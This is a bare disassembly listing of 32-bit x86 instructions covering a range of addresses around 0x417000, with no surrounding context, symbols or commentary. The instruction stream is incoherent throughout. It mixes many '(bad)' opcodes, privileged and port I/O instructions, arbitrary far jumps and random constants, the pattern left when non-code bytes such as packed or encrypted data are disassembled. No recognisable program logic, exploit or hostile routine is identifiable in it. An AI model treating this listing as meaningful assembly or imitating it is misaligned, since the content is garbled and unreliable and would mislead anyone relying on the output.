  416e97:	adc    al,0x63
  416e99:	xor    esi,ebp
  416e9b:	pop    esp
  416e9c:	cmp    ebx,ebx
  416e9e:	nop
  416e9f:	mov    al,ds:0x29499cab
  416ea4:	test   DWORD PTR [ebp-0x326a766],edx
  416eaa:	cmp    edx,DWORD PTR [edx-0x15570a45]
  416eb0:	and    ah,BYTE PTR [esi-0x70]
  416eb3:	or     ah,al
  416eb5:	sbb    eax,0xc6949629
  416eba:	push   ebx
  416ebb:	dec    edx
  416ebc:	ja     0x416efa
  416ebe:	cld    
  416ebf:	lds    edi,FWORD PTR [esi-0x60]
  416ec2:	call   0xdf492688
  416ec7:	mov    bl,BYTE PTR [ebx-0x1e]
  416eca:	imul   eax,DWORD PTR [ecx-0x5e],0x8341dc3c
  416ed1:	fistp  QWORD PTR [edi-0x22]
  416ed4:	mov    ebx,0x4e9874a2
  416ed9:	scas   al,BYTE PTR es:[edi]
  416eda:	add    bl,dl
  416edc:	fwait
  416edd:	jge    0x416e99
  416edf:	fwait
  416ee0:	rcr    BYTE PTR [ebx+0x7e],1
  416ee3:	push   edx
  416ee4:	ds fdivp st(1),st
  416ee7:	mov    esi,0x17c2525a
  416eec:	in     ax,0x8f
  416eef:	jns    0x416ebd
  416ef1:	aad    0xb6
  416ef3:	push   0x4a7f7685
  416ef8:	xlat   BYTE PTR ds:[ebx]
  416ef9:	ss xor al,0xeb
  416efc:	sub    dl,cl
  416efe:	xchg   ecx,eax
  416eff:	dec    eax
  416f00:	scas   al,BYTE PTR es:[edi]
  416f01:	inc    edi
  416f02:	repz test al,0x9b
  416f05:	fst    QWORD PTR [esi+eax*8-0x5d]
  416f09:	in     al,dx
  416f0a:	cmp    DWORD PTR [ecx+0x2c],ebx
  416f0d:	sub    al,0xe3
  416f0f:	cli    
  416f10:	pop    ds
  416f11:	push   ss
  416f12:	sub    al,0xd
  416f14:	pop    ecx
  416f15:	pop    ds
  416f16:	pop    eax
  416f17:	gs inc esi
  416f19:	lds    eax,FWORD PTR [eax-0x3f]
  416f1c:	fwait
  416f1d:	inc    ecx
  416f1e:	popf   
  416f1f:	aad    0xd9
  416f21:	push   0x26
  416f23:	mul    BYTE PTR [ecx-0x32bfe714]
  416f29:	fdiv   DWORD PTR [eax-0x28]
  416f2c:	(bad)  
  416f2e:	push   ebx
  416f2f:	inc    esi
  416f30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f31:	out    dx,eax
  416f32:	scas   al,BYTE PTR es:[edi]
  416f33:	ins    DWORD PTR es:[edi],dx
  416f34:	(bad)  
  416f35:	fnsave [ecx]
  416f37:	mov    dh,0x27
  416f39:	dec    ebp
  416f3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f3b:	data16 or cl,al
  416f3e:	loopne 0x416f58
  416f40:	aaa    
  416f41:	popf   
  416f42:	nop
  416f43:	not    ebx
  416f45:	cmp    BYTE PTR [esi-0x5dfe5d07],ch
  416f4b:	xchg   cl,al
  416f4d:	push   DWORD PTR [edx+0x269e1a62]
  416f53:	repnz xor eax,0x42dec6de
  416f59:	nop
  416f5a:	fs xor ebx,edx
  416f5d:	arpl   WORD PTR [eax-0x6d2839ba],dx
  416f63:	fwait
  416f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f65:	in     eax,dx
  416f66:	fistp  DWORD PTR [eax-0x49]
  416f69:	int    0xc4
  416f6b:	nop
  416f6c:	pop    ebx
  416f6d:	inc    esi
  416f6e:	xchg   ebp,eax
  416f6f:	adc    ch,cl
  416f71:	mov    ecx,0x579bfc0a
  416f76:	sub    DWORD PTR [ebx+0x611f703b],0xfffffffa
  416f7d:	frstor [edi]
  416f7f:	jne    0x416fd7
  416f81:	add    al,0x9b
  416f83:	dec    edi
  416f84:	push   esp
  416f85:	push   0x5987bd90
  416f8a:	mov    ecx,es
  416f8c:	jb     0x416fb3
  416f8e:	icebp  
  416f8f:	dec    ecx
  416f90:	std    
  416f91:	stos   BYTE PTR es:[edi],al
  416f92:	dec    eax
  416f93:	loopne 0x416f18
  416f95:	adc    dl,BYTE PTR [ecx+ebx*4-0x65]
  416f99:	dec    edi
  416f9a:	cmp    BYTE PTR [esi+edx*8+0x364db22f],al
  416fa1:	cli    
  416fa2:	stos   DWORD PTR es:[edi],eax
  416fa3:	mov    WORD PTR [esi+ebx*2],ds
  416fa6:	dec    ebp
  416fa7:	cmp    esi,DWORD PTR [edi]
  416fa9:	xchg   bp,ax
  416fab:	pop    es
  416fac:	lods   eax,DWORD PTR ds:[esi]
  416fad:	nop
  416fae:	mov    bh,0xbb
  416fb0:	fwait
  416fb1:	push   edi
  416fb2:	cmp    eax,0x1fc1a6f2
  416fb7:	dec    edx
  416fb8:	xlat   BYTE PTR ds:[ebx]
  416fb9:	lods   al,BYTE PTR ds:[esi]
  416fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fbb:	cli    
  416fbc:	pushf  
  416fbd:	(bad)  
  416fbe:	rol    DWORD PTR [esi-0x65],cl
  416fc1:	jp     0x416fe8
  416fc3:	mov    bh,0xc3
  416fc5:	jns    0x417027
  416fc7:	test   al,0x45
  416fc9:	push   es
  416fca:	push   esi
  416fcb:	or     esi,DWORD PTR [edx]
  416fcd:	fsubrp st(5),st
  416fcf:	mov    cl,0x29
  416fd1:	ret    0xff1b
  416fd4:	sahf   
  416fd5:	dec    esp
  416fd6:	fwait
  416fd7:	cmp    al,0xa7
  416fd9:	sub    ecx,ecx
  416fdb:	leave  
  416fdc:	shl    BYTE PTR [esi-0x59401cd],1
  416fe2:	xchg   ebp,eax
  416fe3:	loope  0x416f93
  416fe5:	fstp   QWORD PTR [edi+0x73211879]
  416feb:	bound  ebx,QWORD PTR [ebx-0x433b1d6]
  416ff1:	call   0xde187fad
  416ff6:	dec    esi
  416ff7:	xor    dl,dl
  416ff9:	sti    
  416ffa:	sti    
  416ffb:	inc    edi
  416ffc:	bound  esp,QWORD PTR [edi-0x37]
  416fff:	xor    ch,BYTE PTR [ebx-0x22]
  417002:	std    
  417003:	cs mov edx,0x7a5491fd
  417009:	fidivr WORD PTR [eax-0x58f6864a]
  41700f:	div    BYTE PTR [ebx+ebx*4]
  417012:	nop
  417013:	and    bl,al
  417015:	fcmovu st,st(6)
  417017:	pop    ecx
  417018:	mov    eax,ds:0x2fda8239
  41701e:	nop
  41701f:	sub    BYTE PTR [eax+0xe080943],cl
  417025:	pop    ebp
  417026:	nop
  417027:	add    DWORD PTR [edi],edx
  417029:	pop    ds
  41702a:	jno    0x417068
  41702c:	test   DWORD PTR [edi+0x11944a3e],ebp
  417032:	adc    dl,dh
  417034:	int3   
  417035:	xchg   BYTE PTR [ecx+0x3],bl
  417038:	cdq    
  417039:	pop    esp
  41703a:	nop
  41703b:	jns    0x41709f
  41703d:	sti    
  41703e:	jg     0x416fc0
  417040:	inc    ebp
  417041:	jmp    edx
  417043:	dec    ecx
  417044:	cmp    DWORD PTR [edi],eax
  417046:	imul   ebx,DWORD PTR [edi-0x660fbbed],0xffffff9b
  41704d:	es add al,0xa3
  417050:	sub    ah,BYTE PTR [edi-0x67]
  417053:	cmp    bh,BYTE PTR [ebp+ebx*8+0x34ec944b]
  41705a:	icebp  
  41705b:	sti    
  41705c:	sub    edx,ecx
  41705e:	nop
  41705f:	cmp    eax,0x780e561c
  417064:	scas   eax,DWORD PTR es:[edi]
  417065:	(bad)  
  417066:	ins    BYTE PTR es:[edi],dx
  417067:	dec    edx
  417068:	cmp    edx,DWORD PTR [edx+ecx*2+0x17]
  41706c:	cmp    BYTE PTR [ebp+0x249b8f02],al
  417072:	bound  eax,QWORD PTR [edx-0x1a]
  417075:	mov    BYTE PTR [esi+0x32],ch
  417078:	dec    eax
  417079:	or     ch,BYTE PTR [edi-0x3121b78a]
  41707f:	stos   DWORD PTR es:[edi],eax
  417080:	hlt    
  417081:	mov    bl,0x9b
  417083:	dec    ebx
  417084:	fwait
  417085:	out    dx,eax
  417086:	push   eax
  417087:	sbb    al,0x1b
  417089:	fist   DWORD PTR [esi+0x56ddcc58]
  41708f:	xor    al,0xd2
  417091:	pop    ds
  417092:	arpl   si,sp
  417094:	pop    edi
  417095:	gs nop
  417097:	test   BYTE PTR [edx+0x2a],0xfa
  41709b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41709c:	cmc    
  41709d:	sahf   
  41709e:	popa   
  41709f:	dec    edx
  4170a0:	sub    DWORD PTR [edx],esi
  4170a2:	xchg   DWORD PTR [ebp+0x2c8d7c81],edx
  4170a8:	fwait
  4170a9:	sub    al,0x63
  4170ab:	xchg   ecx,eax
  4170ac:	stos   DWORD PTR es:[edi],eax
  4170ad:	mov    ch,0x2f
  4170af:	retf   0xddc7
  4170b2:	jae    0x4170ea
  4170b4:	(bad)  
  4170b5:	adc    esi,DWORD PTR [ecx]
  4170b7:	mov    ah,0xd9
  4170b9:	and    edx,DWORD PTR [eax-0x1c701c59]
  4170bf:	xchg   esi,eax
  4170c0:	xor    eax,0x5767e4a2
  4170c5:	mov    bh,0x66
  4170c7:	dec    edx
  4170c8:	jo     0x417062
  4170ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170cb:	(bad)  
  4170cd:	adc    BYTE PTR [eax+0x36ee4c79],0x48
  4170d4:	out    0x5d,al
  4170d6:	aad    0x49
  4170d8:	dec    ecx
  4170d9:	ins    BYTE PTR es:[edi],dx
  4170da:	mov    dl,0x19
  4170dc:	div    esp
  4170de:	xor    ebx,DWORD PTR [ebp-0x60]
  4170e1:	rcl    DWORD PTR [esi],cl
  4170e3:	dec    ebx
  4170e4:	hlt    
  4170e5:	dec    edx
  4170e6:	adc    BYTE PTR [ebx+0x517028cd],dl
  4170ec:	mov    bh,0x5d
  4170ee:	add    ecx,esi
  4170f0:	xchg   ebx,eax
  4170f1:	mov    esi,0xb85cc420
  4170f6:	sahf   
  4170f7:	enter  0xa9f8,0x83
  4170fb:	scas   eax,DWORD PTR es:[edi]
  4170fc:	cwde   
  4170fd:	xor    dl,BYTE PTR [eax]
  4170ff:	sub    dl,al
  417101:	and    al,0xb3
  417103:	addr16 add eax,ecx
  417106:	pusha  
  417107:	dec    edx
  417108:	jno    0x417094
  41710a:	add    ch,BYTE PTR [ebx+0x68]
  41710d:	mov    bl,0x90
  41710f:	addr16 mov ch,0x97
  417112:	sub    al,0x7e
  417114:	pop    es
  417115:	xor    bh,BYTE PTR [edx]
  417117:	dec    ebx
  417118:	fmul   QWORD PTR [eax-0x64]
  41711b:	out    dx,eax
  41711c:	sub    BYTE PTR [esi+0x14],bh
  41711f:	xor    dl,BYTE PTR [esi-0x6a]
  417122:	sub    bh,al
  417124:	jge    0x41711d
  417126:	(bad)  
  417127:	in     al,dx
  417128:	scas   al,BYTE PTR es:[edi]
  417129:	adc    cl,BYTE PTR ds:0x7bec69d4
  41712f:	dec    ebp
  417130:	loopne 0x4170d8
  417132:	imul   esi,DWORD PTR [edi-0x7bb7eb70],0x7e943db8
  41713c:	dec    eax
  41713d:	sub    BYTE PTR [ecx-0x788ba193],0x1
  417144:	fild   DWORD PTR [esi-0x13cb57b2]
  41714a:	lea    ebx,[eax]
  41714c:	mov    esi,0x32197318
  417151:	(bad)  
  417152:	mov    cl,bl
  417154:	jg     0x4170e2
  417156:	leave  
  417157:	jl     0x4170dd
  417159:	popa   
  41715a:	lods   al,BYTE PTR ds:[esi]
  41715b:	in     al,0xc3
  41715d:	stos   DWORD PTR es:[edi],eax
  41715e:	test   BYTE PTR [ecx-0x32],al
  417161:	sub    BYTE PTR [ecx-0xe],0x17
  417165:	push   esp
  417166:	mov    cl,0x4a
  417168:	and    bh,BYTE PTR [esi]
  41716a:	jp     0x417112
  41716c:	mov    ah,BYTE PTR [ecx]
  41716e:	inc    esi
  41716f:	inc    edx
  417170:	shr    BYTE PTR [ecx],cl
  417172:	nop
  417173:	or     eax,0x3eb38b23
  417178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417179:	jge    0x4171b9
  41717b:	dec    edx
  41717c:	mov    bl,0xe4
  41717e:	or     DWORD PTR ds:0xc4d09950,ecx
  417184:	fwait
  417185:	xor    al,0x8a
  417187:	test   DWORD PTR [ebp+0x6e984083],ecx
  41718d:	fidivr WORD PTR [esp+ebp*2+0x51]
  417191:	scas   eax,DWORD PTR es:[edi]
  417192:	jl     0x4171bd
  417194:	jle    0x41716a
  417196:	nop
  417197:	call   0xcb3c95c4
  41719c:	ds fs dec dx
  4171a0:	jl     0x41717b
  4171a2:	push   ss
  4171a3:	mov    bl,0x31
  4171a5:	in     al,0x71
  4171a7:	and    edi,DWORD PTR [ecx-0x6486441b]
  4171ad:	stos   DWORD PTR es:[edi],eax
  4171ae:	or     eax,0x12723e5
  4171b3:	dec    edx
  4171b4:	mov    al,0x22
  4171b6:	dec    ecx
  4171b7:	or     DWORD PTR [ebx],0xffffff9d
  4171ba:	and    cl,dl
  4171bc:	fwait
  4171bd:	push   edx
  4171be:	jmp    0x417158
  4171c0:	fnstsw WORD PTR [edx+0x5b]
  4171c3:	adc    al,0x40
  4171c5:	fidivr WORD PTR [edx-0x39]
  4171c8:	jge    0x41715a
  4171ca:	cmp    al,0xc
  4171cc:	popf   
  4171cd:	fcom   DWORD PTR [eax+0x27b453b0]
  4171d3:	std    
  4171d4:	les    eax,FWORD PTR [edi-0x372fae7a]
  4171da:	mov    edx,0x706db430
  4171df:	ins    DWORD PTR es:[edi],dx
  4171e0:	xor    ecx,ebx
  4171e2:	jne    0x417222
  4171e4:	js     0x417201
  4171e6:	nop
  4171e7:	cmp    eax,0x9eaf361d
  4171ec:	xchg   esp,eax
  4171ed:	pop    ebx
  4171ee:	enter  0x2f49,0xa8
  4171f2:	xchg   edx,eax
  4171f3:	jmp    0x759b:0x20c16a83
  4171fa:	lods   al,BYTE PTR ds:[esi]
  4171fb:	mov    DWORD PTR [edx-0x78],esp
  4171fe:	mov    ah,0x75
  417200:	out    0xdd,eax
  417202:	scas   eax,DWORD PTR es:[edi]
  417203:	bt     DWORD PTR [edi+eax*2],ecx
  417207:	pushf  
  417208:	out    0xe4,al
  41720a:	scas   al,BYTE PTR es:[edi]
  41720b:	out    0xc3,al
  41720d:	mov    dh,0x9e
  41720f:	sbb    ebp,DWORD PTR [ecx]
  417211:	pop    esi
  417212:	sti    
  417213:	mov    DWORD PTR [ecx+0x6349a0ce],esp
  417219:	cs xchg edx,eax
  41721b:	leave  
  41721c:	test   BYTE PTR [esi+eax*8],bl
  41721f:	xchg   edx,eax
  417220:	(bad)  
  417222:	jp     0x4171ef
  417224:	xchg   ebp,eax
  417225:	mov    al,BYTE PTR [edi]
  417227:	(bad)  [edx]
  417229:	dec    edx
  41722a:	push   eax
  41722b:	cmp    al,BYTE PTR [ecx+eiz*8]
  41722e:	xchg   BYTE PTR [edx+0x67],dh
  417231:	addr16 jb 0x4171d3
  417234:	sbb    eax,DWORD PTR [edx]
  417236:	dec    edi
  417237:	call   FWORD PTR [ebx-0x31c6e3d0]
  41723d:	not    al
  41723f:	jns    0x41729c
  417241:	ficomp WORD PTR [edi+0x427ebcb2]
  417247:	test   BYTE PTR [eax+0x370f90a1],dl
  41724d:	mov    DWORD PTR [eax],eax
  41724f:	and    BYTE PTR [eax+0x30],dl
  417252:	or     cl,BYTE PTR [edx-0x47]
  417255:	sub    al,BYTE PTR [ebx+esi*4-0x2f]
  417259:	push   cs
  41725a:	aas    
  41725b:	rcr    BYTE PTR [ebx+0x2dcbfa0b],1
  417261:	and    al,0xb7
  417263:	xor    DWORD PTR [esi+ebx*8-0xd9ffcd9],0xa613ee25
  41726e:	sub    BYTE PTR [edi-0x65],0xb4
  417272:	out    0xf5,al
  417274:	outs   dx,BYTE PTR ds:[esi]
  417275:	push   esp
  417276:	mov    eax,0x5dde935e
  41727b:	xchg   esi,eax
  41727c:	int    0xa
  41727e:	dec    esi
  41727f:	loope  0x4172f6
  417281:	mov    DWORD PTR [eax-0x7178428d],edx
  417287:	icebp  
  417288:	jg     0x41724e
  41728a:	inc    ebx
  41728b:	dec    edx
  41728c:	jo     0x417259
  41728e:	cwde   
  41728f:	push   eax
  417290:	inc    edi
  417291:	loop   0x4172ff
  417293:	mov    edx,0x42c5119b
  417298:	cld    
  417299:	sbb    BYTE PTR [edx],dh
  41729b:	(bad)  
  41729c:	in     al,0xdd
  41729e:	dec    ebx
  41729f:	jno    0x4172a9
  4172a1:	sbb    esp,DWORD PTR [eax-0x75aa9dad]
  4172a7:	push   0x1b80ca9b
  4172ac:	mov    ah,0x19
  4172ae:	jns    0x41726f
  4172b0:	inc    ebp
  4172b1:	es mov edi,0x3f3d9be5
  4172b7:	leave  
  4172b8:	push   ecx
  4172b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172ba:	push   edx
  4172bb:	push   ss
  4172bc:	xlat   BYTE PTR ds:[ebx]
  4172bd:	mov    dh,0xee
  4172bf:	leave  
  4172c0:	xchg   ebp,eax
  4172c1:	push   ebp
  4172c2:	xchg   edx,eax
  4172c3:	jl     0x41731a
  4172c5:	shl    DWORD PTR [edx+ecx*2-0x30],1
  4172c9:	std    
  4172ca:	sbb    eax,0xc05957f5
  4172cf:	mov    ecx,0x6f3a169b
  4172d4:	std    
  4172d5:	rol    ecx,cl
  4172d7:	fyl2x  
  4172d9:	(bad)  
  4172db:	mov    esi,0xd1691c65
  4172e0:	or     cl,BYTE PTR [esi-0x8ab6670]
  4172e6:	jl     0x41734e
  4172e8:	push   eax
  4172e9:	xchg   ebp,eax
  4172ea:	mov    BYTE PTR [ecx+0x5e],bl
  4172ed:	jecxz  0x417282
  4172ef:	ret    0x29bc
  4172f2:	cwde   
  4172f3:	test   DWORD PTR ds:0x9b45d3ac,edi
  4172f9:	stc    
  4172fa:	mov    esp,0x825e6662
  4172ff:	inc    edi
  417300:	pusha  
  417301:	sbb    dh,BYTE PTR [ebp-0x4583e486]
  417307:	imul   esp,DWORD PTR [ebx+0x53b8942a],0xb2d0caeb
  417311:	loopne 0x41732b
  417313:	jno    0x41737c
  417315:	add    BYTE PTR [edx+ecx*8+0x580774e6],0xc
  41731d:	test   BYTE PTR [ebx-0x49],0x3b
  417321:	mov    dl,0x10
  417323:	mov    DWORD PTR [esi-0x5f12fa4a],edx
  417329:	or     dh,BYTE PTR [edi]
  41732b:	enter  0x5269,0x90
  41732f:	push   cs
  417330:	inc    ebp
  417331:	outs   dx,BYTE PTR ds:[esi]
  417332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417333:	sahf   
  417334:	mov    DWORD PTR [ecx],ebx
  417336:	pop    ds
  417337:	push   edx
  417338:	popf   
  417339:	pop    ds
  41733a:	xor    dh,BYTE PTR [ebp+0x70]
  41733d:	or     edx,DWORD PTR [ecx-0x4d]
  417340:	fcomp  DWORD PTR [ebp-0x60]
  417343:	stos   DWORD PTR es:[edi],eax
  417344:	loope  0x4173bc
  417346:	adc    al,0x8e
  417348:	push   esi
  417349:	cld    
  41734a:	stos   DWORD PTR es:[edi],eax
  41734b:	enter  0x1f13,0xa2
  41734f:	mov    cs,esp
  417351:	mov    ebp,0x2ce8125a
  417356:	nop
  417357:	sbb    BYTE PTR [edx+0x21e5ef39],cl
  41735d:	(bad)  
  41735e:	in     al,dx
  41735f:	gs xchg ecx,eax
  417361:	push   0xffffffb2
  417363:	mov    bl,BYTE PTR [eax-0xc]
  417366:	xchg   ebx,eax
  417367:	or     eax,0xef7c4dad
  41736c:	fwait
  41736d:	(bad)  
  41736e:	sub    DWORD PTR [ebx+0x1f],ebx
  417371:	dec    ebp
  417372:	test   eax,0x26d803e9
  417377:	dec    edx
  417378:	dec    ebp
  417379:	inc    edi
  41737a:	loop   0x4173f3
  41737c:	xor    ebp,DWORD PTR [ecx]
  41737e:	loope  0x4173cb
  417380:	or     al,0x6c
  417382:	add    al,0x3e
  417384:	ret    
  417385:	aas    
  417386:	mov    al,ds:0xfbbd9c21
  41738b:	je     0x417333
  41738d:	outs   dx,DWORD PTR ds:[esi]
  41738e:	xor    cl,ch
  417390:	cmp    DWORD PTR [di],0xefa9864a
  417397:	pop    esp
  417398:	fiadd  DWORD PTR [ebp-0x5a64bf2f]
  41739e:	adc    BYTE PTR [eax-0x15],al
  4173a1:	or     DWORD PTR [edi+0x34d5ad4a],esi
  4173a7:	dec    edx
  4173a8:	iret   
  4173a9:	push   ebx
  4173aa:	and    edx,edx
  4173ac:	daa    
  4173ad:	add    edx,DWORD PTR [ebp+0x372a9b5a]
  4173b3:	sbb    BYTE PTR [esi+0x5c],0x2e
  4173b7:	inc    esp
  4173b8:	mov    eax,ds:0xad92f7dd
  4173bd:	sub    eax,ecx
  4173bf:	xchg   DWORD PTR [ebp-0x6e],ecx
  4173c2:	nop
  4173c3:	xchg   edi,eax
  4173c4:	sub    al,0xc5
  4173c6:	dec    edi
  4173c7:	mov    ecx,DWORD PTR [edx+edi*1-0x2e12993b]
  4173ce:	stos   BYTE PTR es:[edi],al
  4173cf:	leave  
  4173d0:	lods   al,BYTE PTR ds:[esi]
  4173d1:	jge    0x417361
  4173d3:	xchg   ebx,eax
  4173d4:	xchg   ebx,eax
  4173d5:	les    edx,FWORD PTR [eax-0x76]
  4173d8:	cmc    
  4173d9:	mov    edx,ds
  4173db:	shr    BYTE PTR [edi-0x22],cl
  4173de:	pop    esi
  4173df:	or     bl,BYTE PTR [edx]
  4173e1:	pop    esp
  4173e2:	cmp    ebx,DWORD PTR [eax+ecx*4]
  4173e5:	ja     0x417377
  4173e7:	sub    al,0x5
  4173e9:	clc    
  4173ea:	lods   al,BYTE PTR ds:[si]
  4173ec:	cmp    DWORD PTR [ecx],esi
  4173ee:	mov    ecx,0xb1ed37c2
  4173f3:	sbb    al,0xed
  4173f5:	mov    esp,0x22ace9b0
  4173fa:	clc    
  4173fb:	(bad)
  4173fe:	fidivr DWORD PTR [ebp-0x653ccf62]
  417404:	hlt    
  417405:	loopne 0x417475
  417407:	or     edi,DWORD PTR [eax-0x79]
  41740a:	pop    eax
  41740b:	xchg   ebx,eax
  41740c:	sbb    ebp,esp
  41740e:	ins    DWORD PTR es:[edi],dx
  41740f:	aam    0xf6
  417411:	mov    al,0x9f
  417413:	dec    ecx
  417414:	pop    ebx
  417415:	jle    0x417443
  417417:	sbb    ebx,DWORD PTR [ebx+0x4787ad93]
  41741d:	xchg   esi,eax
  41741e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41741f:	xor    DWORD PTR [ecx+0x43df8cec],esp
  417425:	test   al,dh
  417427:	jmp    0x4173ee
  417429:	sti    
  41742a:	call   0xcb82:0xb69b9b1a
  417431:	(bad)  
  417432:	and    BYTE PTR [edi+0x5a],ch
  417435:	out    0xfb,eax
  417437:	cmp    BYTE PTR [ebx],bh
  417439:	enter  0x5890,0x1b
  41743d:	mov    eax,0xec9b7864
  417442:	dec    ebp
  417443:	ss and ah,BYTE PTR ds:[esi-0x28]
  417448:	xchg   esi,eax
  417449:	cli    
  41744a:	xchg   ebp,eax
  41744b:	scas   al,BYTE PTR es:[edi]
  41744c:	sbb    BYTE PTR [esi],bl
  41744e:	sub    BYTE PTR [eax+0x3d561040],ah
  417454:	mov    ds:0xd671728,al
  417459:	hlt    
  41745a:	(bad)  
  41745b:	fisubr WORD PTR [edx+0x7c]
  41745e:	adc    ecx,DWORD PTR [edx+0x38]
  417461:	adc    ah,BYTE PTR [edi-0x189d7705]
  417467:	ret    0x169d
  41746a:	adc    ebx,0xd
  41746d:	pop    edx
  41746e:	dec    esp
  41746f:	or     cl,BYTE PTR [ecx-0x4ab297ac]
  417475:	jb     0x4174e7
  417477:	dec    ebp
  417478:	add    edx,edi
  41747a:	xor    BYTE PTR [esi+ecx*1],dh
  41747d:	pop    ecx
  41747e:	nop
  41747f:	dec    edi
  417480:	cmp    ah,BYTE PTR [ebx+eax*8]
  417483:	xor    DWORD PTR [edx+0x53],0xca7a49b7
  41748a:	add    BYTE PTR [edx+eax*4-0x39],0xa2
  41748f:	sbb    BYTE PTR [ebx-0x69b79ec1],0x84
  417496:	mov    ah,0x8d
  417498:	out    0xdd,al
  41749a:	pop    ebp
  41749b:	retf   
  41749c:	pop    es
  41749d:	mul    DWORD PTR [esi-0x80]
  4174a0:	mov    ebx,esp
  4174a2:	(bad)  
  4174a3:	mov    esp,0x96e0dd0b
  4174a8:	mov    WORD PTR [edi-0x7804b335],es
  4174ae:	jne    0x4174ea
  4174b0:	dec    edi
  4174b1:	dec    esp
  4174b2:	push   ebx
  4174b3:	xchg   BYTE PTR [edi+eax*8+0x3],bh
  4174b7:	inc    esi
  4174b8:	(bad)  
  4174b9:	cmp    dl,BYTE PTR [eax+0x7ae111cf]
  4174bf:	or     DWORD PTR [esi+0x549db71],edi
  4174c5:	scas   eax,DWORD PTR es:[edi]
  4174c6:	mov    esi,0x123c552b
  4174cb:	or     eax,0x9c85899b
  4174d0:	frstor [ebp-0x45]
  4174d3:	adc    eax,0x3f865212
  4174d8:	xchg   edi,eax
  4174d9:	push   0xffffffc4
  4174db:	inc    ecx
  4174dc:	in     al,dx
  4174dd:	fnstsw WORD PTR [ecx+eiz*1]
  4174e0:	cmp    eax,DWORD PTR [esi+0x3ff14dfd]
  4174e6:	nop
  4174e7:	in     al,dx
  4174e8:	jmp    0x950a:0x3d9842e5
  4174ef:	dec    ecx
  4174f0:	inc    BYTE PTR [ebp+edi*1+0x22]
  4174f4:	push   ebx
  4174f5:	cld    
  4174f6:	xor    eax,edi
  4174f8:	fwait
  4174f9:	and    ah,BYTE PTR [ebp+0x7c]
  4174fc:	jnp    0x4174bd
  4174fe:	inc    DWORD PTR [ebx-0x59741cc6]
  417504:	or     eax,0x3209e274
  417509:	icebp  
  41750a:	fisubr DWORD PTR [esi]
  41750c:	pushf  
  41750d:	push   ebp
  41750e:	(bad)  
  41750f:	mov    al,ds:0x704ae081
  417514:	or     esi,DWORD PTR [ecx-0x32dcb4ae]
  41751a:	loope  0x417577
  41751c:	pop    ds
  41751d:	sbb    al,cl
  41751f:	or     eax,0x678ffcc6
  417524:	ss add eax,0x5438b757
  41752a:	(bad)
  41752e:	loopne 0x41758e
  417530:	mov    ebx,0x9b721207
  417535:	inc    esp
  417536:	sub    esi,DWORD PTR [edi-0x57]
  417539:	arpl   WORD PTR [edi-0x31220ef6],di
  41753f:	xor    al,0x5f
  417541:	cdq    
  417542:	pop    ss
  417543:	aad    0x35
  417545:	sub    BYTE PTR [eax],0xac
  417548:	cmp    ebx,DWORD PTR [edi-0x38]
  41754b:	sbb    bh,al
  41754d:	add    al,0x18
  41754f:	ds fwait
  417551:	xor    eax,0xd6e0d887
  417556:	sub    BYTE PTR [edx-0x2f],cl
  417559:	cmp    eax,0xc9e83840
  41755e:	inc    esp
  41755f:	sub    ebx,DWORD PTR [ebx+0x55bdec6]
  417565:	mov    WORD PTR [ebx],es
  417567:	jp     0x4175b0
  417569:	dec    edi
  41756a:	jbe    0x4175b7
  41756c:	mov    ebx,0xaa393d1a
  417571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417572:	test   eax,0x915e9735
  417577:	jo     0x41750b
  417579:	retf   
  41757a:	jp     0x41757c
  41757c:	pop    eax
  41757d:	xor    BYTE PTR [edi-0x651c8cb6],al
  417583:	mov    eax,cs:0x913e73a2
  417589:	call   FWORD PTR [ebp-0x1ba8ccda]
  41758f:	dec    ecx
  417590:	mov    bl,0x5b
  417592:	mov    ecx,DWORD PTR [esi]
  417594:	fnsetpm(287 only) 
  417596:	sahf   
  417597:	not    ebp
  417599:	dec    ecx
  41759a:	adc    BYTE PTR [edx],bl
  41759c:	in     al,dx
  41759d:	addr16 enter 0x1456,0x51
  4175a2:	add    DWORD PTR [eax-0x5e],edx
  4175a5:	jo     0x417550
  4175a7:	or     eax,DWORD PTR ds:0xa9efe08e
  4175ad:	jmp    0xb2c6bf9d
  4175b2:	xchg   BYTE PTR [ebx],ch
  4175b4:	jg     0x4175ec
  4175b6:	out    dx,al
  4175b7:	jne    0x417554
  4175b9:	retf   
  4175ba:	ffreep st(1)
  4175bc:	out    0xd8,al
  4175be:	mov    bh,0x6f
  4175c0:	fisub  WORD PTR es:[edx*2+0xf99803f]
  4175c8:	stc    
  4175c9:	push   0xffffff90
  4175cb:	mov    ecx,DWORD PTR [edi-0x9fee712]
  4175d1:	lods   eax,DWORD PTR ds:[esi]
  4175d2:	push   ecx
  4175d3:	push   ecx
  4175d4:	mov    eax,0x99270647
  4175d9:	mov    ss,WORD PTR [eax+0x57]
  4175dc:	ret    0xe85a
  4175df:	pusha  
  4175e0:	sbb    ebx,esi
  4175e2:	iret   
  4175e3:	cmc    
  4175e4:	scas   eax,DWORD PTR es:[edi]
  4175e5:	rcl    cl,cl
  4175e7:	addr16 rcr ch,1
  4175ea:	mov    WORD PTR [ebp-0x75],fs
  4175ed:	adc    DWORD PTR [edx-0x6d4cb2e5],ebp
  4175f3:	adc    al,0x57
  4175f5:	std    
  4175f6:	mov    bl,0xa9
  4175f8:	mov    ds,WORD PTR [esi]
  4175fa:	adc    ch,dh
  4175fc:	pusha  
  4175fd:	fimul  WORD PTR [ecx]
  4175ff:	int    0x36
  417601:	mov    dl,0x81
  417603:	ret    0xb2eb
  417606:	nop
  417607:	ret    0x8d94
  41760a:	(bad)  
  41760b:	mov    ebp,0x58d006e9
  417610:	mov    ebx,0xbb81e8ab
  417615:	shr    edx,0x7
  417618:	push   ebx
  417619:	js     0x4175ab
  41761b:	jg     0x417630
  41761d:	aas    
  41761e:	xor    al,0x5f
  417620:	xchg   edx,eax
  417621:	cmp    al,0x45
  417623:	pop    ecx
  417624:	or     al,0xc3
  417626:	and    eax,0xffd61b9d
